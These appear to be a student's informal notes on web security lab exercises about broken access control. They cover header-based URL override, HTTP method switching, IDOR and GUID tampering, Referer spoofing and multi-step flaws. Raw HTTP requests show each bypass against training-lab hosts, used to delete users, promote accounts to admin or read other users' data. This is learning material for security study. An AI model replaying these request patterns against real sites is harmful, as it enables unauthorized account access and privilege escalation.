======================================================
Broken Acess contorl 
======================================================
Lab: URL-based access control can be circumvented 


POST /admin/deleteuser  -> deny  

POST /
X-Original-URL : /admin/deleteuser
or                                    -> allow 
X-Rewrite-URL  : /admin/deleteuser  

exmaple  

GET /?username=carlos HTTP/1.1
Host: 0ad70029038d7aee82b64c7b0045004d.web-security-academy.net
X-Original-URL: /admin/delete
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://0ad70029038d7aee82b64c7b0045004d.web-security-academy.net/login
Connection: close
Cookie: session=lUPLpLcsC9WIPQ3cwJC2N1WXZ4Ot1vWM
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

========================================================================
Lab: Method-based access control can be circumvented 
========================================================================
GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
Host: 0aef008f04a821bd848f271f00770024.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Origin: https://0aef008f04a821bd848f271f00770024.web-security-academy.net
Connection: close
Referer: https://0aef008f04a821bd848f271f00770024.web-security-academy.net/admin
Cookie: session=keghOyErSrtzBlbEwiT1JOaFpZvZLuZP
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1



by change the POST method to getmethod and mulnaplite the ?usernmae from clarlos to weiner 
which is lead to promte the weiner user

=====================================================================================
Broken access control resulting from URL-matching discrepancies
=====================================================================================



======================================================================================
Horizontal privilege escalation
======================================================================================
gain access to other user acconut info rmation that have the same privgilge 
exmaple
https://insecure-website.com/myaccount?id=123
by chabgring the 
id will be access to other account or get other acount info

======================================================================================
User ID controlled by request parameter, with unpredictable user IDs 
======================================================================================
somr times insted of using number they use GUID so the attcker can not access to 
other user account , but some times the GUID disclderd 

the GUID of the user are exposed in the blog place 
take the guid of user and put it so you can access to the
user page

GET /my-account?id=fc1cacc6-46fa-4e4a-98b8-fd04df2a8ee4 HTTP/1.1
Host: 0a1c0016045496fb8267f68700f4003e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: https://0a1c0016045496fb8267f68700f4003e.web-security-academy.net/my-account?id=fc1cacc6-46fa-4e4a-98b8-fd04df2a8ee4
Cookie: session=JJJce4Qg7THlfbie9Rf5CMCz33ISF4m5
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1



======================================================================================
User ID controlled by request parameter with data leakage in redirect
======================================================================================
some times the app detect within the user try to access to the resources not bleng
the them and the app rederict it to other page thre response of the redirction conations sensitve info 

example 
HTTP/1.1 302 Found
Location: /login
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 3655

api key in reesponse body 

======================================================================================
Horizontal to vertical privilege escalation
======================================================================================
ight allow an attacker to reset or capture the password belonging to another user. 
If the attacker targets an administrative user and compromises their account, then they can 
gain administrative access and so perform vertical privilege escalation.
For example, an attacker might be able to gain access to another user's account page 
using the parameter tampering technique already described for horizontal privilege escalation:
https://insecure-website.com/myaccount?id=456




GET /my-account?id=administrator HTTP/1.1
Host: 0adb00bb039b1a8b85506e1700d20065.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://0adb00bb039b1a8b85506e1700d20065.web-security-academy.net/my-account?id=carlos
Connection: close
Cookie: session=RkEp7SAjU9Q2bDH3Aym5dQ1JBqBqLUM8
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Pragma: no-cache
Cache-Control: no-cache

by change the user to admin it is retive the password of admin 


======================================================================================
Insecure direct object references
======================================================================================
IDOR arises when an application uses user-supplied input to access objects directly 
and an attacker can modify the input to obtain unauthorized access


in this example change number of file so the file retive carlos usernmae
GET /download-transcript/1.txt HTTP/1.1
Host: 0ac000f303f6b22085de05c6002d00db.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://0ac000f303f6b22085de05c6002d00db.web-security-academy.net/chat
Connection: close
Cookie: session=TdJWwAFBfeyU1jltMdhi7jPxaH4Tmffn
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin


======================================================================================
Access control vulnerabilities in multi-step processes                               =
======================================================================================
Many Websites impkemnt important function on mutlple steps and ,  this  done when we need
to capture some input  or options  
for example the admin need to change user details function may invloves  
1- Load form containing details for a specific user.
2- submit changes
3-  review changes  
some websites perfrom  valdition on steps and igenore some steps  

exmpale
by cahnge the user session  and  change username in the conformation request the winer user 
priogage changes 
 
POST /admin-roles HTTP/1.1
Host: 0adb006e030107b681a83e6900ac00f7.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 45
Origin: https://0adb006e030107b681a83e6900ac00f7.web-security-academy.net
Connection: close
Referer: https://0adb006e030107b681a83e6900ac00f7.web-security-academy.net/admin-roles
Cookie: session=Zy9eRhAxsqxhUtWPNZrosrQMe7PoXWgF
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

action=upgrade&confirmed=true&username=wiener


======================================================================================
Referer-based access control
======================================================================================
Some pages relays on the referre header to 
For example, suppose an application robustly enforces access control over the main administrative page at /admin, but for 
sub-pages such as /admin/deleteUser only inspects the Referer header. If the Referer header contains the main /admin 
URL, then the request is allowed.

access sunpages using referer heade

GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
Host: 0af400ed03c4c2488197161e00b4007d.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: https://0af400ed03c4c2488197161e00b4007d.web-security-academy.net/admin
Cookie: session=x6clDgSg77oJ6Bvfq1Sin9fpSlvQQIXc
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1



if you delete the refrer header you will get 401 
but if you change the username and cookie you can promote weiner user  


======================================================================================
Location-based access control
======================================================================================
Some web sites enforce access controls over resources based on the user's geographical location. This can apply, for example, to banking applications
 or media services where state legislation or business restrictions apply. 
These access controls can often be circumvented by the use of web proxies, VPNs, or manipulation of client-side geolocation mechanisms. 













